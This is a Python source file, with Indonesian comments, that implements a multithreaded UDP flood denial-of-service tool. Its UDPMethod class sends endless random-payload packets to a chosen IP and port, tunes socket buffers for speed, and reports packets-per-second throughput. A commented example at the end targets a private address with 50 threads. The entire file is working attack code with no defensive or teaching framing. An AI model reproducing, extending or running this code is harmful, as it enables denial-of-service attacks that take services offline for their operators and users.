import signal
import socket
import random
import threading
import time
from colorama import Fore
from src.helpers import Helpers

class UDPMethod:
    def __init__(self, target_ip, target_port, thread_count, packet_size=512):
        self.target_ip = target_ip
        self.target_port = target_port
        self.thread_count = thread_count
        self.packet_size = packet_size
        self.running = True

    def udp_attack(self):
        """Fungsi UDP Flood Attack dengan perbaikan performa dan kestabilan."""

        def attack():
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Reuse address
                client.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 10**7)
                packet = random._urandom(self.packet_size)
                sent = 0
                start_time = time.time()

                while True:
                    client.sendto(packet, (self.target_ip, self.target_port))
                    sent += 1
                    # Hitung kecepatan pengiriman paket per detik (PPS)
                    if sent % 1000 == 0:
                        elapsed = time.time() - start_time
                        pps = sent / elapsed if elapsed > 0 else 0
                        print(Fore.BLUE, f"[+] {sent} UDP packets sent to {self.target_ip}:{self.target_port} | PPS: {pps:.2f}")

            except Exception as e:
                print(Fore.RED, f"[-] UDP Thread Error: {e}")

        print(f"🚀 Memulai UDP Attack ke {self.target_ip}:{self.target_port} dengan {self.thread_count} thread...")
        threads = []
        for _ in range(self.thread_count):
            thread = threading.Thread(target=attack)
            thread.daemon = True
            thread.start()
            threads.append(thread)

        try:
            while True:
                time.sleep(1)  # Membiarkan thread tetap berjalan
        except KeyboardInterrupt:
            print(Fore.RED, "\n🛑 Serangan UDP dihentikan oleh pengguna.")

    def udp_flood(self):
        # signal.signal(signal.SIGINT, Helpers.signal_handler)
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = random._urandom(self.packet_size)  # Paket acak

        i = 0
        while self.running:
            try:
                client.sendto(packet, (self.target_ip, self.target_port))
                i += 1
                if i % 1000 == 0:
                    print(Fore.GREEN, f"[+] {i} packets sent to {self.target_ip}:{self.target_port}")
            except Exception as e:
                print(f"[-] Error: {e}")
                break

    def start_attack(self):
        print(Fore.BLUE, f"🚀 Memulai serangan UDP ke {self.target_ip}:{self.target_port} dengan {self.thread_count} thread...")
        threads = []
        for _ in range(self.thread_count):
            thread = threading.Thread(target=self.udp_flood)
            thread.daemon = True  # Thread akan otomatis tertutup saat program utama selesai
            thread.start()
            threads.append(thread)

        try:
            while True:
                pass  # Serangan berjalan tanpa henti
        except KeyboardInterrupt:
            self.running = False
            print(Fore.RED, f"\n🛑 Serangan dihentikan oleh pengguna.")

# attack = UDPMethod(target_ip="192.168.1.100", target_port=80, thread_count=50, packet_size=4096)
# attack.start_attack()
